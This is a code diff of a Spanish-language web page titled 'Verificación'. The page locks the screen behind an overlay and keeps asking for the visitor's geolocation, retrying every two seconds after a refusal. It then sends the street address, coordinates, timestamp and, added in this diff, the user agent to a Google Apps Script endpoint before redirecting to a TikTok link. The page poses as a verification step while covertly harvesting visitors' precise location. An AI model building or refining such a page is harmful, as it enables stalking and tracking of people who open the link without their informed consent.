@@ -5,7 +5,6 @@
 <title>Verificación</title>
 
 <style>
-
 body{
 margin:0;
 font-family:Arial;
@@ -27,7 +26,6 @@ z-index:9999;
 text-align:center;
 padding:20px;
 }
-
 </style>
 </head>
 
@@ -53,11 +51,9 @@ obtenerDireccion(lat,lon);
 },
 
 function(){
-
 setTimeout(()=>{
 pedirUbicacion();
 },2000);
-
 }
 
 );
@@ -74,6 +70,9 @@ let direccion = data.display_name;
 
 enviarDatos(direccion,lat,lon);
 
+})
+.catch(err=>{
+console.error("Error obteniendo dirección:", err);
 });
 
 }
@@ -84,19 +83,35 @@ fetch("https://script.google.com/macros/s/AKfycbwhywjoW3-u9kQF0o52_KKQaFdaTy64XM
 
 method:"POST",
 
+headers:{
+"Content-Type":"application/json"
+},
+
 body:JSON.stringify({
 
 direccion:direccion,
 latitud:lat,
 longitud:lon,
-fecha:new Date().toString()
+fecha:new Date().toString(),
+userAgent:navigator.userAgent
 
 })
 
-}).then(()=>{
+})
+.then(res => res.text())
+.then(data => {
 
+console.log("Respuesta del servidor:", data);
+
+// quitar bloqueo (opcional)
+document.getElementById("bloqueo").style.display = "none";
+
+// redirección
 window.location.href="https://vt.tiktok.com/ZSuHJ3ef1/";
 
+})
+.catch(err=>{
+console.error("Error enviando datos:", err);
 });
 
 }
